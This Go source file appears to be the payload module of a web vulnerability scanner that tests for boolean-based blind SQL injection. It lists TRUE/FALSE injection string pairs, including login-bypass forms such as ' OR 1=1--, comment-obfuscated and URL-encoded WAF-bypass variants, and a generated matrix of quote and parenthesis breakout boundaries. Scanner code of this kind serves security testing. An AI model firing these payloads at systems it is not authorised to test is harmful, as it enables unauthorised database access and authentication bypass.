package sqli_boolean_blind

import (
	"fmt"

	"github.com/vigolium/vigolium/pkg/modules/infra"
	"github.com/vigolium/vigolium/pkg/utils"
)

// payloadPair represents a TRUE/FALSE payload pair for boolean-based blind SQLi testing.
type payloadPair struct {
	context  string // "string", "numeric", "bypass", "matrix"
	trueVal  string
	falseVal string
	// prefix/suffix are the breakout boundary for matrix payloads; when
	// boundaried is true the confirmation stage can synthesize arbitrary
	// conditions in the same context to run a multi-factor logic battery.
	prefix     string
	suffix     string
	boundaried bool
}

// stringPayloads are payloads for string context injection points.
// AND-based payloads are listed first: comment-terminated variants reliably
// create TRUE/FALSE differentials on login forms (the injected condition is
// the sole deciding factor once the rest of the query is commented out),
// while non-comment variants preserve the remainder of the query so the
// original request naturally matches the TRUE response (useful when the
// surrounding conditions also evaluate to true, e.g. correct password).
var stringPayloads = []payloadPair{
	// AND with comment — best for login forms: TRUE returns user, FALSE returns nothing
	{context: "string", trueVal: "' AND 1=1--", falseVal: "' AND 1=2--"},
	// AND without comment — preserves rest of query; original ≈ TRUE when surrounding conditions hold
	{context: "string", trueVal: "' AND '1'='1", falseVal: "' AND '1'='2"},
	// OR with comment — universal bypass
	{context: "string", trueVal: "' OR 1=1--", falseVal: "' OR 1=2--"},
	// OR without comment — works when base value doesn't match any record
	{context: "string", trueVal: "' OR '1'='1", falseVal: "' OR '1'='2"},
	{context: "string", trueVal: "\" OR \"1\"=\"1", falseVal: "\" OR \"1\"=\"2"},
	{context: "string", trueVal: "' AND CASE WHEN 1=1 THEN 1 ELSE 0 END--", falseVal: "' AND CASE WHEN 1=2 THEN 1 ELSE 0 END--"},
}

// numericPayloads are payloads for numeric context injection points.
var numericPayloads = []payloadPair{
	{context: "numeric", trueVal: " AND 1=1--", falseVal: " AND 1=2--"},
	{context: "numeric", trueVal: " AND 1=1", falseVal: " AND 1=2"},
	{context: "numeric", trueVal: " OR 1=1", falseVal: " OR 1=2"},
	{context: "numeric", trueVal: " OR 1=1--", falseVal: " OR 1=2--"},
	{context: "numeric", trueVal: ") OR (1=1", falseVal: ") OR (1=2"},
}

// bypassPayloads are payloads designed to bypass WAFs.
var bypassPayloads = []payloadPair{
	{context: "bypass", trueVal: "'/**/AND/**/1=1--", falseVal: "'/**/AND/**/1=2--"},
	{context: "bypass", trueVal: "'/**/OR/**/1=1--", falseVal: "'/**/OR/**/1=2--"},
	{context: "bypass", trueVal: "' OR 1=1#", falseVal: "' OR 1=2#"},
	{context: "bypass", trueVal: "%27 OR 1=1--", falseVal: "%27 OR 1=2--"},
	{context: "bypass", trueVal: "' OR 1=1;--", falseVal: "' OR 1=2;--"},
}

// boundary is a breakout context: a prefix that closes the original quoting /
// parenthesis nesting and a suffix that neutralizes the trailing query (a
// comment, or nothing). Decoupling boundaries from the boolean condition — as
// sqlmap does — lets the same TRUE/FALSE logic be tried against ', '), ')),
// ", "), %27 and bare-numeric contexts instead of a handful of hard-coded
// strings, which is what catches injections nested inside functions/subqueries.
type boundary struct {
	prefix string
	suffix string
}

// stringBoundaries cover quoted-string injection contexts.
var stringBoundaries = []boundary{
	{prefix: "'", suffix: "-- -"},
	{prefix: "'", suffix: "#"},
	{prefix: "')", suffix: "-- -"},
	{prefix: "'))", suffix: "-- -"},
	{prefix: "\"", suffix: "-- -"},
	{prefix: "\")", suffix: "-- -"},
	{prefix: "%27", suffix: "-- -"}, // URL-encoded quote (WAF surface)
}

// numericBoundaries cover unquoted numeric injection contexts.
var numericBoundaries = []boundary{
	{prefix: "", suffix: "-- -"},
	{prefix: "", suffix: "#"},
	{prefix: "", suffix: ""}, // unterminated: relies on trailing query staying valid
	{prefix: ")", suffix: "-- -"},
	{prefix: "))", suffix: "-- -"},
}

// distinctNums returns two different random 4-digit numbers for building a
// guaranteed-true (a=a) and guaranteed-false (a=b) comparison. Randomizing the
// operands defeats applications that special-case the literal 1=1 / 1=2.
func distinctNums() (string, string) {
	a := utils.RandomNumber(4)
	for {
		if b := utils.RandomNumber(4); b != a {
			return a, b
		}
	}
}

// buildMatrixPayloads generates TRUE/FALSE pairs from boundaries × {AND, OR}
// conditions with randomized operands.
func buildMatrixPayloads(numeric bool) []payloadPair {
	boundaries := stringBoundaries
	if numeric {
		boundaries = numericBoundaries
	}
	var out []payloadPair
	for _, b := range boundaries {
		for _, op := range []string{"AND", "OR"} {
			a, c := distinctNums()
			trueVal := fmt.Sprintf("%s %s %s=%s%s", b.prefix, op, a, a, b.suffix)
			falseVal := fmt.Sprintf("%s %s %s=%s%s", b.prefix, op, a, c, b.suffix)
			out = append(out, payloadPair{
				context:    "matrix",
				trueVal:    trueVal,
				falseVal:   falseVal,
				prefix:     b.prefix,
				suffix:     b.suffix,
				boundaried: true,
			})
		}
	}
	return out
}

// getPayloadsForValue selects appropriate payloads based on the parameter's
// base value: curated literals first (highest signal, e.g. login-form AND
// pairs), then the randomized boundary matrix, then WAF-bypass variants. A
// fresh slice is built so the package-level payload slices are never mutated.
func getPayloadsForValue(baseValue string) []payloadPair {
	numeric := infra.IsNumericValue(baseValue)
	var out []payloadPair
	if numeric {
		out = append(out, numericPayloads...)
	} else {
		out = append(out, stringPayloads...)
	}
	out = append(out, buildMatrixPayloads(numeric)...)
	out = append(out, bypassPayloads...)
	return out
}
